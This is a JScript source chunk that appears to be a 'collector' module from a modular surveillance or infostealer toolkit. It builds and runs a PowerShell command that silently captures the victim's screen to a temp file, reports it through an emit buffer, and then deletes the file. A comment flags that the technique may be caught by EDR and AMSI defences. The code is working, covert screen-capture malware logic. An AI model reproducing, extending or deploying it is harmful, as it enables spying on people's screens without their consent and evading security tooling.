// chunk: collectors/screenshot_staged
// depends: core/emit_buffer, core/run_cmd
// provides: collect_screenshot
// format: jscript
// note: uses PowerShell .NET for screen capture — may be caught by EDR AMSI

function collect_screenshot() {
    emit("\r\n=== SCREENSHOT ===\r\n");
    var tmp = _s.ExpandEnvironmentStrings("%TEMP%") + "\\sc_" + Math.floor(Math.random() * 99999) + ".png";
    var ps = "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;";
    ps += "$b=[Drawing.Rectangle]::FromLTRB(0,0,[Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);";
    ps += "$bmp=New-Object Drawing.Bitmap($b.Width,$b.Height);";
    ps += "$g=[Drawing.Graphics]::FromImage($bmp);";
    ps += "$g.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size);";
    ps += "$bmp.Save('" + tmp + "',[Drawing.Imaging.ImageFormat]::Png);";
    ps += "$g.Dispose();$bmp.Dispose()";
    _run("powershell -Command \"" + ps + "\"");
    if (file_exists(tmp)) {
        emit("  Screenshot captured: " + tmp + "\r\n");
        try { _fso.DeleteFile(tmp); } catch(ex) {}
    } else {
        emit("  Screenshot failed (PowerShell may be blocked)\r\n");
    }
}
